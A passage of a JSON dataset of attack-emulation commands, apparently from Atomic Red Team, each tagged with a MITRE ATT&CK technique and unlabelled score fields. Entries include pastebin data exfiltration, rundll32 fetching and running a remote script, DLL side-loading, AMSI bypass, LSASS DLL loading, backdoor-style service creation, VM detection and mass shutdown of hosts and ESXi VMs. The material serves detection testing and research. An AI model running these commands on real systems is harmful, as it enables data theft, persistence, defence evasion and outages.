        "Command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for Atomic Red Test\" -ErrorAction Ignore }\n",
        "Description": "Copies and modifies mail data on Windows\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.008",
        "Shell": "powershell"
    },
    {
        "ID": 1322,
        "Command": "mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ \"$(basename \"$file\")\" != \"copy\" ]; then cp -R \"$file\" /var/spool/mail/copy/; if [ -f \"/var/spool/mail/copy/$(basename \"$file\")\" ]; then echo \"Modification for Atomic Red Test\" >> \"/var/spool/mail/copy/$(basename \"$file\")\"; fi; fi; done\n",
        "Description": "Copies and modifies mail data on Linux\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.008",
        "Shell": "bash"
    },
    {
        "ID": 1323,
        "Command": "mkdir ~/Library/Mail/copy\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\necho \"Manipulated data\" > ~/Library/Mail/copy/manipulated.txt\n",
        "Description": "Copies and modifies mail data on macOS\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.008",
        "Shell": "bash"
    },
    {
        "ID": 1324,
        "Command": "$apiKey = \"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\"\n$content = \"secrets, api keys, passwords...\"\n$url = \"https://pastebin.com/api/api_post.php\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option\\t= \"paste\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \"Your paste URL: $response\"\n",
        "Description": "This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             \nSee https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1567.003",
        "Shell": "powershell"
    },
    {
        "ID": 1325,
        "Command": "\"PathToAtomicsFolder\\T1574.002\\bin\\GUP.exe\"\n",
        "Description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1326,
        "Command": "set DOTNET_STARTUP_HOOKS=\"PathToAtomicsFolder\\T1574.002\\bin\\preloader.dll\"\ndotnet -h > nul\necho.\n",
        "Description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1327,
        "Command": "Write-Host 1.Downloading KeyScrambler from official website to temp directory\nInvoke-WebRequest -Uri \"https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe\" -OutFile $env:Temp\\KeyScrambler_Setup.exe\nWrite-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory\nStart-Process -FilePath $env:Temp\\KeyScrambler_Setup.exe -ArgumentList /S -Wait\nWrite-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp\nCopy-Item \"C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe\" -Destination $env:TEMP\\KeyScrambler.exe\nWrite-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup\nStart-Process -FilePath $env:Temp\\KeyScrambler.exe\nWrite-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker",
        "Description": "Various threat actors and malware have been found side loading a masqueraded \"KeyScramblerIE.dll\" through \"KeyScrambler.exe\", which can load further executables embedded in modified KeyScramblerIE.dll file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.002",
        "Shell": "powershell"
    },
    {
        "ID": 1328,
        "Command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi;\nif (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;\n",
        "Description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1497.001",
        "Shell": "sh"
    },
    {
        "ID": 1329,
        "Command": "if [ \"$(sysctl -n hw.hv_vendor)\" != \"\" ]; then echo \"Virtualization Environment detected\"; fi\n",
        "Description": "Detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1497.001",
        "Shell": "sh"
    },
    {
        "ID": 1330,
        "Command": "$error.clear()\nGet-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue\nif($error) {echo \"Virtualization Environment detected\"}\n",
        "Description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1497.001",
        "Shell": "powershell"
    },
    {
        "ID": 1331,
        "Command": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;\n",
        "Description": "ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1497.001",
        "Shell": "sh"
    },
    {
        "ID": 1332,
        "Command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"\n$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"\nif((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}\n",
        "Description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1497.001",
        "Shell": "powershell"
    },
    {
        "ID": 1333,
        "Command": "if [ \"$(sysctl -n hw.model | grep -v 'Mac')\" != \"\" ]; then echo 'Virtualization Environment detected'; fi;\n",
        "Description": "sysctl hw.model will return the model name of the hardware(Macmini8,1, MacBookAir10,1, etc.) in case of native Apple hardware\nbut will return the hypervisor name (VMware7,0).\nReference: https://evasions.checkpoint.com/src/MacOS/macos.html#hardware-model\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1497.001",
        "Shell": "sh"
    },
    {
        "ID": 1334,
        "Command": "if [ \"$(csrutil status | grep -v 'enabled')\" != \"\" ]; then echo 'Possible Virtualization Environment detected'; fi;\n",
        "Description": "The latest versions of macOS have the System Integrity Protection feature (SIP). If a sandbox uses a non-signed \nkernel extension for monitoring purposes the, SIP feature must be disabled to load this kind of kernel extension.\nMalware may check if the SIP is enabled.\nReference: https://evasions.checkpoint.com/src/MacOS/macos.html#sip\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1497.001",
        "Shell": "sh"
    },
    {
        "ID": 1335,
        "Command": "if [ \"$(system_profiler SPHardwareDataType | grep \"Model Identifier\" | grep -v 'Mac')\" != \"\" ]; then echo 'Virtualization Environment detected'; fi;\n",
        "Description": "system_profiler provides system hardware and software configuration and the Model Identifier should provide the value similar to (sysctl -n hw.model). \nWe should be able to find whether virtualization is enabled by checking whether the Model Identifier does not contain \"Mac\".\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1497.001",
        "Shell": "sh"
    },
    {
        "ID": 1336,
        "Command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\"\nsc start Fax\n",
        "Description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1337,
        "Command": "sc.exe create AtomicTestService_CMD binPath= \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\" start=auto  type=Own\nsc.exe start AtomicTestService_CMD\n",
        "Description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1338,
        "Command": "New-Service -Name \"AtomicTestService_PowerShell\" -BinaryPathName \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\"\nStart-Service -Name \"AtomicTestService_PowerShell\"\n",
        "Description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.003",
        "Shell": "powershell"
    },
    {
        "ID": 1339,
        "Command": "copy \"$PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll\" %systemroot%\\system32\\\nsc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto\nsc config W64Time DisplayName= \"Windows 64 Time\"\nsc description W64Time \"Maintain date and time synch on all clients and services in the network\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f\nsc start W64Time",
        "Description": "It's running Dll as service to emulate the TinyTurla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1340,
        "Command": "sc.exe \\\\localhost create AtomicTestService_CMD binPath= \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\" start=auto type=Own\nsc.exe \\\\localhost start AtomicTestService_CMD\n",
        "Description": "Download an executable from github and start it as a service on a remote endpoint\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1341,
        "Command": "Stop-Service -Name \"fax\" -force -erroraction silentlycontinue | Out-Null\nset-servicebinarypath -name \"fax\" -path \"$env:windir\\system32\\notepad.exe\"\nstart-service -Name \"fax\" -erroraction silentlycontinue | out-null",
        "Description": "This test will use PowerShell to temporarily modify a service to run an arbitrary executable by changing its binary path and will then revert the binary path change, restoring the service to its original state.\nThis technique was previously observed through SnapMC's use of Powerspolit's invoke-serviceabuse function. \n[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.003",
        "Shell": "powershell"
    },
    {
        "ID": 1342,
        "Command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();\n",
        "Description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1343,
        "Command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)\n",
        "Description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1344,
        "Command": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)\n",
        "Description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1345,
        "Command": "rundll32.exe advpack.dll,LaunchINFSection \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\",DefaultInstall_SingleUser,1,\n",
        "Description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1346,
        "Command": "rundll32.exe ieadvpack.dll,LaunchINFSection \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\",DefaultInstall_SingleUser,1,\n",
        "Description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1347,
        "Command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\"\n",
        "Description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1348,
        "Command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\"\n",
        "Description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1349,
        "Command": "rundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\"\nrundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\"\n",
        "Description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1350,
        "Command": "rundll32.exe pcwutl.dll,LaunchApplication %windir%\\System32\\notepad.exe\n",
        "Description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1351,
        "Command": "rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW\n",
        "Description": "Rundll32.exe running non-dll \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "powershell"
    },
    {
        "ID": 1352,
        "Command": "rundll32.exe \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx64.dll\",#2\n",
        "Description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1353,
        "Command": "rundll32.exe shell32.dll,Control_RunDLL \"PathToAtomicsFolder\\T1047\\bin\\calc.dll\"\n",
        "Description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1354,
        "Command": "copy %windir%\\System32\\calc.exe not_an_scr.scr\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\n",
        "Description": "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1355,
        "Command": "rundll32.exe PathToAtomicsFolder\\T1218.011\\bin\\_WT.init,krnl\n",
        "Description": "This test, based on common Gamarue tradecraft, consists of a DLL file with a .init extension being run by rundll32.exe. When this DLL file's 'krnl' function is called, it launches a Windows pop-up.\nDLL created with the AtomicTestHarnesses Portable Executable Builder script.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1356,
        "Command": "rundll32.exe url.dll,FileProtocolHandler calc.exe\n",
        "Description": "Test execution of a command using rundll32.exe and the FileProtocolHandler technique.\nUpon execution, calc.exe will be launched.\nThis technique is documented by Levan Abesadze - https://medium.com/@Wolverineisstillalive/system-binary-proxy-execution-rundll32-bypass-method-790871e1f2b7\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1357,
        "Command": "rundll32.exe zipfldr.dll,RouteTheCall \"'%windir%\\System32\\calc.exe'\"",
        "Description": "Launch an executable payload by calling RouteTheCall. Test execution of a command using rundll32.exe to execute a payload{calc.exe} by calling RouteTheCall. Upon execution, calc.exe will be launched.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Zipfldr.yml\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.011",
        "Shell": "powershell"
    },
    {
        "ID": 1358,
        "Command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n",
        "Description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1359,
        "Command": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll WinAppXRT.dll\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\nreg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f\n",
        "Description": ".NET components (a couple of DLLs loaded anytime .NET apps are executed) when they are loaded they look for an environment variable called APPX_PROCESS\nSetting the environmental variable and dropping the phantom WinAppXRT.dll in e.g. c:\\windows\\system32 (or any other location accessible via PATH) will ensure the \nWinAppXRT.dll is loaded everytime user launches an application using .NET.\n\nUpon successful execution, amsi.dll will be copied and renamed to WinAppXRT.dll and then WinAppXRT.dll will be copied to system32 folder for loading during execution of any .NET application.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1360,
        "Command": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll ualapi.dll\ncopy %APPDATA%\\ualapi.dll %windir%\\System32\\ualapi.dll\nsc config Spooler start=auto\n",
        "Description": "Re-starting the Print Spooler service leads to C:\\Windows\\System32\\ualapi.dll being loaded\nA malicious ualapi.dll placed in the System32 directory will lead to its execution whenever the system starts\n\nUpon successful execution, amsi.dll will be copied and renamed to ualapi.dll and then ualapi.dll will be copied to system32 folder for loading during system restart.\nPrint Spooler service is also configured to auto start. Reboot of system is required\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1361,
        "Command": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\"\n",
        "Description": "Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1592.001",
        "Shell": "powershell"
    },
    {
        "ID": 1362,
        "Command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll\"\n",
        "Description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.008",
        "Shell": "powershell"
    },
    {
        "ID": 1363,
        "Command": "reg.exe add HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\WebView\\Inbox /v URL /t REG_SZ /d file://PathToAtomicsFolder\\T1137.004\\src\\T1137.004.html /f\n",
        "Description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1137.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 1364,
        "Command": "shutdown /s /t 1\n",
        "Description": "This test shuts down a Windows system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "command_prompt"
    },
    {
        "ID": 1365,
        "Command": "shutdown /r /t 1\n",
        "Description": "This test restarts a Windows system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "command_prompt"
    },
    {
        "ID": 1366,
        "Command": "shutdown -r now\n",
        "Description": "This test restarts a FreeBSD/macOS/Linux system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "sh"
    },
    {
        "ID": 1367,
        "Command": "shutdown -h now\n",
        "Description": "This test shuts down a FreeBSD/macOS/Linux system using a halt.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "sh"
    },
    {
        "ID": 1368,
        "Command": "reboot\n",
        "Description": "This test restarts a FreeBSD/macOS/Linux system via `reboot`.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "sh"
    },
    {
        "ID": 1369,
        "Command": "halt -p\n",
        "Description": "This test shuts down a FreeBSD/Linux system using `halt`.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "sh"
    },
    {
        "ID": 1370,
        "Command": "halt -r\n",
        "Description": "This test restarts a FreeBSD system using `halt`.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "sh"
    },
    {
        "ID": 1371,
        "Command": "halt --reboot\n",
        "Description": "This test restarts a Linux system using `halt`.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "bash"
    },
    {
        "ID": 1372,
        "Command": "poweroff\n",
        "Description": "This test shuts down a FreeBSD/Linux system using `poweroff`.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "sh"
    },
    {
        "ID": 1373,
        "Command": "poweroff -r 3\n",
        "Description": "This test restarts a FreeBSD system using `poweroff`.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "sh"
    },
    {
        "ID": 1374,
        "Command": "poweroff --reboot\n",
        "Description": "This test restarts a Linux system using `poweroff`.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "bash"
    },
    {
        "ID": 1375,
        "Command": "shutdown /l \n",
        "Description": "This test performs a Windows system logoff as seen in [dcrat backdoor capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "command_prompt"
    },
    {
        "ID": 1376,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" \"atomic.local\" -ssh  -l \"root\" -pw \"pass\" -m \"PathToAtomicsFolder\\T1529\\src\\esx_pkill.txt\"\n",
        "Description": "In VMWARE ESXi, process names starting with vmx are associated with running VMs. An adversary can use the pkill command to kill all processes with a prefix vmx.\n[Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "command_prompt"
    },
    {
        "ID": 1377,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" \"atomic.local\" -ssh  -l \"root\" -pw \"pass\" -m \"PathToAtomicsFolder\\T1529\\src\\esx_avoslocker_kill_vm.txt\"\n",
        "Description": "Avoslocker malware has inbuilt functionality to enumerate the VM instances and uses the esxcli command to forcefully power off them.\n[Reference](https://blogs.vmware.com/security/2022/02/avoslocker-modern-linux-ransomware-threats.html)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "command_prompt"
    },
    {
        "ID": 1378,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" -batch \"atomic.local\" -ssh -l root -pw \"password\" \"for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done\"\n",
        "Description": "Adversaries may power off VMs to facilitate the deployment of ransomware payloads.\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#power%20off%20vm)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1529",
        "Shell": "command_prompt"
    },
    {
        "ID": 1379,
